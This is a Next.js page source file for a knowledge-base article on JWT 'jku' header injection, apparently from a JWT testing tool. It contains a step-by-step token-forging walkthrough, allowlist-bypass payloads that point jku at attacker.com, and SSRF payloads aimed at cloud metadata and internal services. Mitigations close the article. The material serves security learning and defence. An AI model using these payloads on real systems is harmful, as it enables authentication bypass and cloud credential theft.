import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { KbArticle, H2, H3, P, Mono, Ref, ImpactBox } from "@/components/layout/KbArticle";
import { CodeBlock } from "@/components/shared/CodeBlock";
import { InfoCallout } from "@/components/shared/InfoCallout";

export const metadata: Metadata = pageMeta(
  "JKU Injection - Attacker-Controlled JWKS",
  "Point jku at an attacker-controlled JWKS endpoint. The server fetches and trusts it for verification.",
  "/knowledge-base/jku-injection",
);
import "../../globals.css";

export default function Page() {
  return (
    <KbArticle slug="jku-injection">

      <H2>The JWK Set URL</H2>
      <P>
        RFC 7515 §4.1.2 defines the <Mono>jku</Mono> (JWK Set URL) header parameter as a URI
        that refers to a resource for a set of JSON-encoded public keys, one of which corresponds
        to the key used to sign the JWT. The server fetches this URL to retrieve the public key
        for verification - a server-side request triggered by a value in the attacker-controlled token header.
      </P>
      <P>
        The attack is conceptually simple: point <Mono>jku</Mono> at an attacker-controlled endpoint
        that returns a JWKS containing the attacker's public key. The server fetches the JWKS,
        finds the attacker's key, and uses it to verify the forged token - which was signed by the
        corresponding private key. Verification succeeds.
      </P>

      <H2>The JWKS format</H2>
      <CodeBlock language="json" label="jwks.json - attacker's JWKS endpoint" code={`{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "kid": "attacker-2024",
      "n": "sdfG7kPqoK8zRx4s...",     // attacker's public modulus (base64url, no padding)
      "e": "AQAB"                     // 65537 in base64url
    }
  ]
}`} />
      <P>
        JWT Arsenal generates this file automatically after keypair generation.
        Host it at any publicly accessible HTTPS URL, then set <Mono>jku</Mono>
        to that URL in the forged token's header.
      </P>

      <H2>Full attack walkthrough</H2>
      <CodeBlock language="bash" label="Step-by-step attack" code={`# Step 1: Generate an RSA-2048 keypair (JWT Arsenal or openssl)
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Step 2: Build the JWKS file (use JWT Arsenal's JKU page - downloads it)
# Or convert manually: n and e are the base64url-encoded modulus and exponent

# Step 3: Host the JWKS
python3 -m http.server 8080 &
# Expose with ngrok for a public URL:
ngrok http 8080
# → https://abc123.ngrok-free.app

# Step 4: Forge the JWT
# Header: {"alg":"RS256","jku":"https://abc123.ngrok-free.app/jwks.json","kid":"attacker-2024"}
# Payload: {"sub":"admin","role":"superuser","exp":9999999999}
# Sign with attacker.key

# Step 5: Send the forged token - server fetches your JWKS, verifies your signature → bypass`} />

      <H2>Domain bypass techniques</H2>
      <P>
        Many implementations attempt to restrict valid <Mono>jku</Mono> domains.
        A common but ineffective pattern is checking whether the URL <em>starts with</em>
        or <em>contains</em> a trusted domain string. Attackers have a catalogue of bypasses:
      </P>

      <H3>1. Open redirect</H3>
      <CodeBlock language="bash" label="Trusted domain with open redirect" code={`# Server checks: jku.startsWith("https://trusted.example.com")
# Target has an open redirect at /redirect?url=...

jku = "https://trusted.example.com/redirect?url=https://attacker.com/jwks.json"
# → startsWith check passes
# → server follows redirect to attacker.com
# → fetches attacker JWKS`} />

      <H3>2. URL @ confusion</H3>
      <CodeBlock language="bash" label="Credential confusion (RFC 3986)" code={`# RFC 3986 allows credentials before @ in a URL:
# https://user:password@host/path
# Some parsers read "trusted.com" as the username, "attacker.com" as the host

jku = "https://trusted.example.com@attacker.com/jwks.json"
# → string contains "trusted.example.com" → allowlist check passes
# → browser/http client resolves host as "attacker.com"`} />

      <H3>3. URL fragment / query tricks</H3>
      <CodeBlock language="bash" label="Fragment and query confusion" code={`# Fragment (#) is ignored by the server but may fool the string check:
jku = "https://attacker.com/jwks.json#trusted.example.com"

# Query parameter confusion:
jku = "https://attacker.com/jwks.json?host=trusted.example.com"`} />

      <H3>4. Subdomain takeover</H3>
      <P>
        If the server validates that the <Mono>jku</Mono> host ends with <Mono>.trusted.example.com</Mono>,
        a taken-over subdomain (<Mono>expired-cname.trusted.example.com</Mono>) passes validation.
        Subdomain takeovers on cloud providers (Azure, AWS, GitHub Pages) are regularly discovered via
        tools like <Mono>subjack</Mono> and <Mono>nuclei</Mono>.
      </P>

      <H3>5. SSRF pivot</H3>
      <P>
        The server-side HTTP request to fetch the JWKS can be redirected to internal network resources:
      </P>
      <CodeBlock language="bash" label="SSRF via jku" code={`# AWS IMDS (IMDSv1 - no session token required)
jku = "http://169.254.169.254/latest/meta-data/"

# GCP metadata server
jku = "http://metadata.google.internal/computeMetadata/v1/"

# Internal Kubernetes API server
jku = "https://kubernetes.default.svc/api/v1/"

# Internal Redis (non-HTTP response → parse error, but confirms SSRF)
jku = "http://internal-redis:6379/"`} />

      <InfoCallout variant="warning" title="Server-side request requirements">
        This attack requires the vulnerable server to make outbound HTTP requests.
        Environments with strict egress filtering (no internet from the server) are not directly vulnerable
        to the basic variant - but SSRF to internal hosts may still work.
        AWS Lambda and similar serverless environments often have unrestricted egress.
      </InfoCallout>

      <H2>Hosting options for the JWKS</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "20px" }}>
        <li><strong style={{ color: "var(--text)" }}>ngrok / Cloudflare Tunnel</strong> - expose localhost in seconds; HTTPS included</li>
        <li><strong style={{ color: "var(--text)" }}>GitHub Gist (raw)</strong> - static HTTPS hosting, no server required; click "Raw" for a direct URL without redirects</li>
        <li><strong style={{ color: "var(--text)" }}>Pastebin raw</strong> - similar to Gist; check that the raw URL doesn't use JS-rendered content</li>
        <li><strong style={{ color: "var(--text)" }}>requestbin / webhook.site</strong> - logs the incoming request, useful to confirm SSRF/fetch happens</li>
        <li><strong style={{ color: "var(--text)" }}>Burp Collaborator</strong> - confirms server-side DNS/HTTP requests for out-of-band validation</li>
      </ul>

      <ImpactBox title="Bug bounty cases">
        <ul className="refs-list" style={{ lineHeight: 2 }}>
          <li>Exploited in multiple OAuth 2.0 and OIDC providers where the JWS library fetched <Mono>jku</Mono> without domain allowlist enforcement</li>
          <li>Open redirect chains have been used to bypass domain restrictions in production identity providers</li>
          <li>Combined with SSRF to pivot to AWS IMDS and retrieve temporary credentials - chained to full AWS account compromise</li>
          <li>GitHub Security Lab and PortSwigger researchers have demonstrated practical exploitation against real identity providers</li>
        </ul>
      </ImpactBox>

      <H2>Mitigations</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
        <li>Maintain a server-side allowlist of trusted JWKS URLs - pre-configured, not derived from the token</li>
        <li>Perform exact URL matching, not prefix/contains matching</li>
        <li>Disable following of HTTP redirects when fetching JWKS</li>
        <li>Reject tokens containing <Mono>jku</Mono> or <Mono>x5u</Mono> headers unless explicitly required</li>
        <li>If <Mono>jku</Mono> is required, pin the expected URL in configuration and reject any other value</li>
        <li>Cache JWKS responses server-side with appropriate TTL - prevents real-time SSRF probing</li>
      </ul>

      <div>
        <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--text-muted)", marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.06em" }}>References</div>
        <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
          <li><Ref href="https://portswigger.net/web-security/jwt/exploiting#injecting-self-signed-jwts-via-the-jku-parameter">PortSwigger - Injecting self-signed JWTs via the jku parameter</Ref></li>
          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7515#section-4.1.2">RFC 7515 §4.1.2 - jku (JWK Set URL) Header Parameter</Ref></li>
          <li><Ref href="https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html">HackTricks - Hacking JWT Tokens</Ref></li>
          <li><Ref href="https://tools.ietf.org/html/rfc3986">RFC 3986 - Uniform Resource Identifier (URI) syntax</Ref></li>
        </ul>
      </div>

    </KbArticle>
  );
}
